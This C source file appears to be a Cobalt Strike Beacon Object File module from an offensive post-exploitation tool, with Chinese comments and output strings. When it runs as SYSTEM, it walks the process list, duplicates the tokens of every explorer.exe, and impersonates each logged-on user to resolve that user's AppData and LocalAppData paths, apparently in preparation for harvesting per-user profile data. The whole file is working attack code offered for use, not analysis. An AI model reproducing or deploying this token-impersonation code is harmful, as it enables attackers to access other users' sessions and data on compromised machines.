#include "plg_common.h"
#include <tlhelp32.h>

#ifndef TOKEN_QUERY
#define TOKEN_QUERY 0x0008
#endif
#ifndef TOKEN_DUPLICATE
#define TOKEN_DUPLICATE 0x0002
#endif
#ifndef TOKEN_IMPERSONATE
#define TOKEN_IMPERSONATE 0x0004
#endif
#ifndef MAXIMUM_ALLOWED
#define MAXIMUM_ALLOWED 0x02000000
#endif
#ifndef SecurityImpersonation
#define SecurityImpersonation 2
#endif
#ifndef TokenImpersonation
#define TokenImpersonation 2
#endif
#ifndef TokenUser
#define TokenUser 1
#endif
#ifndef PROCESS_QUERY_LIMITED_INFORMATION
#define PROCESS_QUERY_LIMITED_INFORMATION 0x1000
#endif

typedef DWORD SID_NAME_USE_, *PSID_NAME_USE_;

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$DuplicateTokenEx(HANDLE, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, PHANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, DWORD, LPVOID, DWORD, LPDWORD);
WINADVAPI BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE_);
WINADVAPI BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$RevertToSelf(VOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(VOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL WINAPI USERENV$ExpandEnvironmentStringsForUserA(HANDLE, LPCSTR, LPSTR, DWORD);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$Process32FirstW(HANDLE, LPPROCESSENTRY32W);
WINBASEAPI BOOL WINAPI KERNEL32$Process32NextW(HANDLE, LPPROCESSENTRY32W);
/* GetUserNameA 在 advapi32.dll；写 KERNEL32$ 会导致 LoadLibrary(KERNEL32) 解析失败 */
WINADVAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);

static int wexe_is_explorer(const wchar_t *w) {
	static const wchar_t ex[] = L"explorer.exe";
	size_t i;
	for (i = 0; ex[i]; i++) {
		wchar_t a = w[i], b = ex[i];
		if (a >= L'A' && a <= L'Z')
			a = (wchar_t)(a - L'A' + L'a');
		if (b >= L'A' && b <= L'Z')
			b = (wchar_t)(b - L'A' + L'a');
		if (a != b)
			return 0;
	}
	return w[i] == 0;
}

static int path_seen_before(const PlgSession *sess, int n, const char *local) {
	int i;
	for (i = 0; i < n; i++) {
		if (MSVCRT$_stricmp(sess[i].local, local) == 0)
			return 1;
	}
	return 0;
}

static void sanitize_tag(const char *in, char *out, size_t osz) {
	const char *p;
	char *q = out;
	for (p = in; *p && (size_t)(q - out) < osz - 1; p++) {
		unsigned char c = (unsigned char)*p;
		if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))
			*q++ = (char)c;
		else if (c == '\\' || c == '/' || c == ' ' || c == '-' || c == '.' || c == '@')
			*q++ = '_';
	}
	*q = 0;
	if (!out[0])
		MSVCRT$strcpy(out, "user");
}

static int fill_tag_from_token(HANDLE tok, char *tag, size_t tagsz) {
	PTOKEN_USER tu = NULL;
	DWORD need = 0, ret;
	char name[256], dom[256];
	DWORD nl = sizeof(name), dl = sizeof(dom);
	SID_NAME_USE_ snu = 0;
	if (!ADVAPI32$GetTokenInformation(tok, TokenUser, NULL, 0, &need) &&
	    KERNEL32$GetLastError() != 122)
		return -1;
	tu = (PTOKEN_USER)plg_alloc(need);
	if (!tu)
		return -1;
	if (!ADVAPI32$GetTokenInformation(tok, TokenUser, tu, need, &ret)) {
		plg_free(tu);
		return -1;
	}
	if (!ADVAPI32$LookupAccountSidA(NULL, tu->User.Sid, name, &nl, dom, &dl, &snu)) {
		plg_free(tu);
		return -1;
	}
	plg_free(tu);
	MSVCRT$_snprintf(tag, tagsz, "%s_%s", dom[0] ? dom : "", name);
	sanitize_tag(tag, tag, tagsz);
	return 0;
}

static int collect_from_explorer(PlgSession *out, int maxout, int *count) {
	HANDLE snap;
	PROCESSENTRY32W pe;
	DWORD mypid = KERNEL32$GetCurrentProcessId();
	snap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE)
		return -1;
	pe.dwSize = sizeof(pe);
	if (!KERNEL32$Process32FirstW(snap, &pe)) {
		KERNEL32$CloseHandle(snap);
		return -1;
	}
	do {
		HANDLE hp, ht, dup;
		if (pe.th32ProcessID == 0 || pe.th32ProcessID == mypid)
			continue;
		if (!wexe_is_explorer(pe.szExeFile))
			continue;
		hp = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
		if (!hp)
			continue;
		ht = NULL;
		dup = NULL;
		if (!ADVAPI32$OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE, &ht)) {
			KERNEL32$CloseHandle(hp);
			continue;
		}
		if (!ADVAPI32$DuplicateTokenEx(ht, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &dup)) {
			KERNEL32$CloseHandle(ht);
			KERNEL32$CloseHandle(hp);
			continue;
		}
		KERNEL32$CloseHandle(ht);
		KERNEL32$CloseHandle(hp);
		{
			char local[PLG_MAX_PATH], appdata[PLG_MAX_PATH];
			DWORD sz;
			MSVCRT$memset(local, 0, sizeof(local));
			MSVCRT$memset(appdata, 0, sizeof(appdata));
			sz = (DWORD)sizeof(local);
			if (!USERENV$ExpandEnvironmentStringsForUserA(dup, "%LOCALAPPDATA%", local, sz)) {
				KERNEL32$CloseHandle(dup);
				continue;
			}
			sz = (DWORD)sizeof(appdata);
			if (!USERENV$ExpandEnvironmentStringsForUserA(dup, "%APPDATA%", appdata, sz)) {
				KERNEL32$CloseHandle(dup);
				continue;
			}
			if (local[0] == 0 || appdata[0] == 0) {
				KERNEL32$CloseHandle(dup);
				continue;
			}
			if (path_seen_before(out, *count, local)) {
				KERNEL32$CloseHandle(dup);
				continue;
			}
			if (*count >= maxout) {
				KERNEL32$CloseHandle(dup);
				break;
			}
			out[*count].token = dup;
			MSVCRT$strncpy(out[*count].local, local, sizeof(out[*count].local) - 1);
			out[*count].local[sizeof(out[*count].local) - 1] = 0;
			MSVCRT$strncpy(out[*count].appdata, appdata, sizeof(out[*count].appdata) - 1);
			out[*count].appdata[sizeof(out[*count].appdata) - 1] = 0;
			out[*count].user_tag[0] = 0;
			if (fill_tag_from_token(dup, out[*count].user_tag, sizeof(out[*count].user_tag)) < 0)
				MSVCRT$_snprintf(out[*count].user_tag, sizeof(out[*count].user_tag), "pid%u", (unsigned)pe.th32ProcessID);
			(*count)++;
		}
	} while (KERNEL32$Process32NextW(snap, &pe));
	KERNEL32$CloseHandle(snap);
	return 0;
}

static int is_system_like(void) {
	char uname[256];
	DWORD ulen = sizeof(uname);
	if (!ADVAPI32$GetUserNameA(uname, &ulen))
		return 0;
	if (MSVCRT$_stricmp(uname, "SYSTEM") == 0)
		return 1;
	if (MSVCRT$_stricmp(uname, "LOCAL SERVICE") == 0)
		return 1;
	if (MSVCRT$_stricmp(uname, "NETWORK SERVICE") == 0)
		return 1;
	return 0;
}

int plg_collect_sessions(PlgSession *out, int maxout, int *count) {
	*count = 0;
	if (maxout <= 0)
		return -1;
	if (!is_system_like()) {
		if (!KERNEL32$GetEnvironmentVariableA("LOCALAPPDATA", out[0].local, sizeof(out[0].local) - 1))
			return -1;
		if (!KERNEL32$GetEnvironmentVariableA("APPDATA", out[0].appdata, sizeof(out[0].appdata) - 1))
			return -1;
		out[0].token = NULL;
		out[0].user_tag[0] = 0;
		*count = 1;
		return 0;
	}
	collect_from_explorer(out, maxout, count);
	if (*count == 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "[i] SYSTEM 下未发现可模拟的 explorer.exe，回退当前环境变量");
		if (!KERNEL32$GetEnvironmentVariableA("LOCALAPPDATA", out[0].local, sizeof(out[0].local) - 1))
			return -1;
		if (!KERNEL32$GetEnvironmentVariableA("APPDATA", out[0].appdata, sizeof(out[0].appdata) - 1))
			return -1;
		out[0].token = NULL;
		out[0].user_tag[0] = 0;
		*count = 1;
	} else {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] SYSTEM：已枚举 %d 个交互会话（explorer 令牌）", *count);
	}
	return 0;
}

void plg_session_close_all(PlgSession *sess, int n) {
	int i;
	for (i = 0; i < n; i++) {
		if (sess[i].token)
			KERNEL32$CloseHandle(sess[i].token);
		sess[i].token = NULL;
	}
}

int plg_session_impersonate(PlgSession *s) {
	if (!s || !s->token)
		return 0;
	return ADVAPI32$ImpersonateLoggedOnUser(s->token) ? 0 : -1;
}

void plg_session_revert(void) {
	ADVAPI32$RevertToSelf();
}
